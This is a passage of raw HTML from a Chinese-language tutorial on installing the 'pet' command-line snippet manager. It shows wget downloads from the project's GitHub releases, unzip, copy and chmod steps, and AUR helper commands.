crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nwget https://github.com/knqyf263/pet/releases/download/v0.2.4/pet_0.2.4_linux_amd64.zip\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127ba6953941497-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127ba6953941497-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127ba6953941497-1\"><span class=\"crayon-e\">wget </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/knqyf263/pet/releases/download/v0.2.4/pet_0.2.4_linux_amd64.zip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127ba6953941497-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>对于 32 位计算机：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bb0104784051\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nwget https://github.com/knqyf263/pet/releases/download/v0.2.4/pet_0.2.4_linux_386.zip\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bb0104784051-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bb0104784051-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bb0104784051-1\"><span class=\"crayon-e\">wget </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/knqyf263/pet/releases/download/v0.2.4/pet_0.2.4_linux_386.zip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bb0104784051-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>解压下载的文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bb5237286666\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nunzip pet_0.2.4_linux_amd64.zip\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bb5237286666-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bb5237286666-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bb5237286666-1\"><span class=\"crayon-e\">unzip </span><span class=\"crayon-v\">pet_0</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">2.4_linux_amd64.zip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bb5237286666-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>对于 32 位：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bb8752044362\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nunzip pet_0.2.4_linux_386.zip\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bb8752044362-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bb8752044362-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bb8752044362-1\"><span class=\"crayon-e\">unzip </span><span class=\"crayon-v\">pet_0</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">2.4_linux_386.zip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bb8752044362-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>将 <code>pet</code> 二进制文件复制到 PATH（即 <code>/usr/local/bin</code> 之类的）。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bbb612702977\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo cp pet /usr/local/bin/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bbb612702977-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bbb612702977-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bbb612702977-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">cp </span><span class=\"crayon-v\">pet</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bbb612702977-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>最后，让它可以执行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bbe718674233\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo chmod +x /usr/local/bin/pet\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bbe718674233-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bbe718674233-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bbe718674233-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">pet</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bbe718674233-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>如果你使用的是基于 Arch 的系统，那么你可以使用任何 AUR 帮助工具从 AUR 安装它。</p>\n<p>使用 <a href=\"https://www.ostechnix.com/install-pacaur-arch-linux/\">Pacaur</a>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bc1577382109\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npacaur -S pet-git\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bc1577382109-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bc1577382109-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bc1577382109-1\"><span class=\"crayon-v\">pacaur</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pet</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bc1577382109-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>使用 <a href=\"https://www.ostechnix.com/install-packer-arch-linux-2/\">Packer</a>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bc5875211862\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npacker -S pet-git\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bc5875211862-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bc5875211862-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bc5875211862-1\"><span class=\"crayon-v\">packer</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pet</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bc5875211862-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>使用 <a href=\"https://www.ostechnix.com/install-yaourt-arch-linux/\">Yaourt</a>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bc8799828384\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nyaourt -S pet-git\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127bc8799828384-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127bc8799828384-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127bc8799828384-1\"><span class=\"crayon-v\">yaourt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pet</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127bc8799828384-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>使用 <a href=\"https://www.ostechnix.com/yay-found-yet-another-reliable-aur-helper/\">Yay</a>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127bcb756142353\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div 